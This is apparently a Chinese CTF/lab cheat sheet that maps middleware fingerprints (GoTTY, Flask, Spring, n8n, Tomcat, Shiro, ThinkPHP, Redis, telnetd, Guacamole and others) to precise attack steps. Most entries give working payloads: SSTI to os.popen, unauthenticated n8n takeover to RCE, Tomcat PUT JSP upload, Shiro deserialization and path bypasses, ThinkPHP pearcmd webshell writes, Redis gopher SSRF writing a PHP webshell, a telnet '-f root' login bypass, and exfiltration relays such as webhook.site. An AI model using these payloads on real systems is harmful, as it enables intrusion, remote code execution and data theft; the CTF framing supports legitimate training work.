> **定位**：`中间件漏洞.md` 是"通用中间件弹药库"，本卡是"**实测过的具体指纹 → 精确打法**"。
> 每条格式：**认**（指纹特征）→ **打**（该指纹的默认打法）→ **坑**（实测踩到的差异点）。

## 二、逐条详解

### §1 GoTTY（fork 版）— 网页终端

- **认**：网页终端；WS 端点 `/ws`；token 在 `/auth_token.js` 的 `gotty_auth_token`
- **打**：握手 `{"Arguments":"?arg=<token>","AuthToken":"<token>"}` + WS subprotocol `gotty`；输入帧 `"0"+按键`；输出帧 `"0"+base64`
- **坑**：**自动化后等于直接拿 root shell** —— 应急线上机排查题常是它（357/359/361-365/371 系列）；手工敲命令慢，写脚本收帧才快

### §2 Flask / Werkzeug

- **认**：响应头 `Werkzeug/x.y.z` + `Python/3.x`
- **打**：
  1. `/console`（调试台，PIN 保护）存在即深挖
  2. `static_folder='.'` 时 `/app.py`、`/Dockerfile` 可直接下载 ⇒ 先捞源码
  3. SSTI：`{{7*'7'}}` 判 Jinja2 → `lipsum.__globals__` → `os.popen`
  4. Flask flash 会话：302 的 `Set-Cookie` → base64(payload) → flash 消息（**判定词同时试中文与 `\uXXXX` 字面两种形式**）
- **坑**：单线程 dev server ⇒ **薄容器纪律**（目录扫 `-t 1~2`，爆破 4-6 并发）；`/console` 的 PIN 可算（werkzeug PIN 算法）

### §3 Spring Boot / Swagger

- **认**：`/swagger-resources`、`/v2/api-docs`、`/actuator/*` 未授权；根路径返回 JSON 404
- **打**：`/swagger-resources` → `/v2/api-docs` → 从 `paths` 挑内部接口**原路径直连（不加 `/api` 前缀）**；`/actuator` 全开时取 heapdump / env
- **坑**：**路径前缀按 api-docs 里的原样来**，自己加前缀必 404；heapdump 几十 MB，要看里面有没有 env 注入的 FLAG

### §4 n8n

- **认**：版本从 `/rest/sentry.js` 的 `release=` 读；`/rest/settings` 的 `userManagement.showSetupOnFirstLoad=true` = 未初始化
- **打**：`POST /rest/owner/setup` **匿名接管实例** → 建 workflow → Set 节点表达式沙箱逃逸（`this.process.mainModule.require`）→ `execSync` RCE（**常直接是 root**）
- **坑**：先看 `showSetupOnFirstLoad`，非 true 说明已初始化，接管口关闭

### §5 Tomcat

- **认**：① `readonly=false` ⇒ `PUT` 可写；② 版本显示 8.5.19 之类但**同样可利用**（别被版本号劝退）；③ `.jspx` / `.jjspsp` 映射取决于 `web.xml`
- **打**：
  1. CVE-2017-12615：`PUT /s1.jsp/`（**末尾斜杠绕过后缀校验**），`%20`、`::$DATA` 等价变体三种都返 201
  2. Ghost Bits 上传（后端 `& 0xFF` 截断 ⇒ 特殊字符落盘成 `.jsp`）
  3. `manager/html` 弱口令
- **坑**：三种 PUT 变体都试，别试一个 201 就当成功 —— **要访问一次确认解析**

### §6 Shiro

- **认**：① `rememberMe=deleteMe` 响应 = Shiro 存在；② 认证绕过看**未规范化的原始 URI**
- **打**：
  1. Shiro-550：`rememberMe` = AES-CBC(默认 key) 包 ysoserial 流；22 个常见 key 未中时考虑 **GCM 模式或自定义 key**
  2. CVE-2020-1957：`/xx/..;/admin/` 与 `/x/%2e%2e;/admin/` 返 200 进管理页（**单 `/admin..;/` 反而 404**）
- **坑**：**同一批路径变体逐个试**，一个 404 不代表这条路不通；key 全爆不出 ⇒ 别死磕，转认证绕过

### §7 Adminer

- **认**：登录页多驱动下拉；版本 4.6.2 等
- **打**：
  1. CVE-2021-43008：`LOAD DATA LOCAL` 读客户端文件（需自建恶意 MySQL：握手带 `CLIENT_LOCAL_FILES=0x80`，对 `SET NAMES` 回 `0xFB`+文件路径）
  2. CVE-2021-21311：SSRF echo 通道
- **坑**：**失败 ~31 次锁 30 分钟，且按 `REMOTE_ADDR`（换 session / UA / XFF 全无效）** ⇒ **枚举预算 ≤25 次**，先内定优先级；锁了只能重开靶场换容器

### §8 Apache CXF

- **认**：Aegis DataBinding 端点（`/test`）；SOAP 报错文本
- **打**：CVE-2024-28752：`xop:Include href` 不限协议 → `href="file:///tmp/flag.txt"`；**内容以 base64 出现在报错 `Unmarshalling Error: Not a number: <b64>` 里**（因为 count 是 `xs:int`）
- **坑**：**答案在报错里**，记得对 base64 解码后再判定（别在原始响应上正则找 `flag`）

### §9 Gradio

- **认**：`/file=` 下载端点；版本 ≤3.x
- **打**：CVE-2023-51449（**读 fix commit 反推**）：`abspath()` 不规范化绝对路径 + `is_in_or_equal` 只查 `startswith("..")` ⇒ `/file=<合法前缀>/<真实存在子目录>/%2e%2e/%2e%2e/<目标>`
- **坑**：**合法前缀必须真实存在**（先 `POST /upload` 建目录）；用 `%2e` 而不是 `.` 防 curl/代理提前规范化；flag 不一定在描述说的位置

### §10 ThinkPHP

- **认**：`/index.php?s=` 路由风格；报错页 TP logo；`X-Powered-By: ThinkPHP`
- **打**：
  - 2.x：`${@print(md5(233))}` 式 eval
  - 5.0.20：`invokefunction`
  - 5.0.23：`_method=__construct`
  - **6.0.12 lang LFI + pearcmd `config-create` 写马** —— 四条坑位：
    1. lang 包含会自动补 `.php`
    2. pearcmd 路径 = `langpath + 7×../ + usr/local/lib/php/pearcmd`
    3. `argv` 按 `+` 切分且**恰好 2 个参数**（`lang=` 必须最前、目标文件名必须收尾）
    4. root 参数原样进配置序列化串；`<` `>` 被过滤时用 `chr()` 拼
  - include oracle：bare pearcmd = 362B 报错、默认页 = 868B（**用响应长度判断包含是否真的命中**）
- **坑**：四条缺一条就不通；`lang=` 位置错了前端不报错但也不执行

### §11 WebLogic

- **认**：控制台 `/console`
- **打**：CVE-2020-14882 / 14883
- **坑**：**重型容器在本平台两次启动失败（7 分钟仍 000）** ⇒ **5 分钟不可达即弃**，换时段或换题（别在启动上反复等）

### §12 Spring Cloud Function / Gateway

- **认**：`/functionRouter`；`/actuator/gateway/routes` 未授权
- **打**：① CVE-2022-22963：`spring.cloud.function.routing-expression` SpEL；② CVE-2022-22947：`POST /actuator/gateway/routes/{id}` 创建路由带 SpEL
- **坑**：**实证：路由创建返 201 但不持久化 ⇒ 该 build 回显链不通** —— 看 201 别当成功，要验证命令回显

### §13 Redis

- **认**：6379；`INFO` 回 `redis_version:3.2.6` ⇒ 古董版本，**直接按未授权打**
- **打**：SSRF → Redis → RCE：`CONFIG SET dir /var/www/html` → `CONFIG SET dbfilename x.php` → `SET pwn "<php>"` → `SAVE` → `GET /x.php`
- **协议选择是关键**：
  - `dict://` 适合探测与**无特殊字符**命令（`%20` 不解码、用字面空格；`?` 被 curl 当 query 截断）
  - 含 `?` / `%` 必须 `gopher://` + `%XX` 全编码
  - RDB 写的 php 前面有 REDIS 二进制垃圾，**不影响执行**
- **坑**：**收尾要删木马并把 `dir` / `dbfilename` 改回**（否则影响后续题/被判异常）

### §14 MongoDB

- **认**：27017 直连无认证
- **打**：直查库表即可（如 `ctf_challenge.flags`）
- **坑**：**题面引导常是烟雾弹**（如"堆内存"引导），直接看库；`pymongo` 不带 `compressors` 也能过

### §15 telnetd

- **认**：23 端口 telnet 协商
- **打**：CVE-2026-24061：NEW-ENVIRON 注入 `USER="-f root"` → `login` 跳过认证直接 root shell
- **坑**：**非 NEW-ENVIRON 的 DO 一律回 `WONT`**（全回 WILL 会卡死协商）；官方 PoC `SafeBreach-Labs/CVE-2026-24061`（raw 断连走 jsdelivr）

### §16 Emlog

- **认**：源码 `include/lib/option.php` 的 `EMLOG_VERSION = 'pro 2.5.26'`
- **打**：CVE-2026-22799：后台任意文件上传 → 落地 `content/uploadfile/YYYYMM/<rand>.php`
- **坑**：**木马 `.php` 会被本机 Defender 隔离，取证只能靠旁证**（`pass.txt` 的 key + 冰蝎特征 `e45e329feb5d925b`）

### §17 Ollama

- **认**：11434
- **打**：CVE-2024-45436
- **坑**：**版本在洞内但需恶意 registry 且无外联回路 ⇒ 物理不可得** ⇒ 止损

### §18 前端加密 JS（通用指纹，跨题高频）

- **认**：页面加载 `encrypt.js`、`btoa(...)`、隐藏字段承载密文
- **打**：**前端加密=白给**：从 JS 抠 key / IV / Base32 字典 → Python 复刻 → 照常爆破
- **坑**：同一批题常**共用同一套硬编码 key**（实测：6 个 JWT 题共用 `jwt-weak-secret-key-123456789012` + IV `1234567890123456`）⇒ 抠出一次全批通用

### §19 蓝奏云（附件分发侧）

- **认**：分享页返回 4321 字节反爬 JS；`acw_sc__v2` cookie
- **打**：绕过算法 = **unsbox 置换表 + XOR `3000176000856006061501533003690027800375`**；`acw_sc__v2` 签名单次有效
- **坑**：浏览器 `downloadMedia` 是兜底，但 IAB 下载句柄会锁死 tmp 文件（换进程/重开浏览器）

### §20 公网中转服务（NAT 环境的标准替代品）

- **认**：靶机在 NAT 后、**不可被回连**（只能出网）
- **打**：一律改用出网型方案：
  | 需求 | 用什么 |
  |---|---|
  | 托管 payload / JWKS / 恶意 DTD | `paste.rs` |
  | 收外带数据（XSS / XXE / SSRF 盲打） | `webhook.site` |
  | 暴露自建恶意 MySQL | `bore.pub` |
  | 暴露投毒 relay（Agent 攻击） | `npx localtunnel` |
- **坑**：动手前**先测回连方向**（`example.com:80` 可连 ≠ 任意端口可连）—— 这是"能不能打"的第一道闸

### §21 Guacamole 网关（无客户端远程桌面 / 堡垒机）

- **认**：路径 `/guacamole/`、`/api/tokens`、`/api/session/...`；页面 JS 有 `Guacamole.WebSocketTunnel`；
  默认凭据 **`guacadmin:guacadmin`**（自建镜像也可能是 `test:test`）；常配 8080/8443 + **guacd 4822**
- **打（一句话：它只是转发器，认出底层再直连）**：
  1. **直连底层标准协议**（最干净）：拿到连接定义或发现目标开 3389/5900/22 ⇒
     `xfreerdp /v:IP /u:U /p:P` / `vncviewer IP:5900` / `ssh` —— **绕开网关本身**
  2. **平台 API**：`POST /api/tokens` 换 `authToken` → `GET /api/session/data/<源>/connections?token=…` 列连接；
     隧道走 `WS /api/session/.../tunnel`，子协议 `guacamole`
  3. **后认证原语**（有账号即用）：**telnet 连接的会话录制 = 任意路径写文件**
     （写 `authorized_keys2` 最稳，写 JSP 需 guacd 与 Tomcat 同容器）；
     **telnet 连接 = 不限目标的 SSRF**（可从 loopback 打 PostgreSQL/AJP ⇒ 命令执行）
  > 完整链条、分级判据、部署形态差异见 **`中间件漏洞.md` §Guacamole 网关**
- **坑**：
  - **4822 常只在容器内网** ⇒ 扫不到 4822 ≠ 没有 Guacamole
  - **8080 是 Tomcat 的 ≠ guacd 可达 webroot**：一体镜像 vs docker-compose，利用面差一个量级
  - **手搓 WS 协议解不出响应是常态**（非打印字节丢、只回截图）⇒ 用 puppeteer 挂 WebSocket，别硬写协议
  - **"能登录后台" ≠ "拿到目标 shell"** —— 报危害时说清哪一层
  - 它是堡垒机：若属于**演练平台自身**，动它 = 攻击平台（红线）

## 三、本卡维护规则

1. **只收实测指纹**（有题号支撑），不写"可能有"的猜测。
2. 每条只保留三样：**认 / 打 / 坑** —— 详细原理去 `中间件漏洞.md` 或 `web/` 对应篇。
3. 新指纹出现时（比赛里遇到没收录的系统）：打完把这三样补进来，附一句"实测来源"。
4. 与 `中间件漏洞.md` 的分工：那边是**通用弹药**（Shiro / Fastjson / Redis 等大类的完整姿势），这边是**指纹 → 精确打法**（含版本、路径、坑位）。
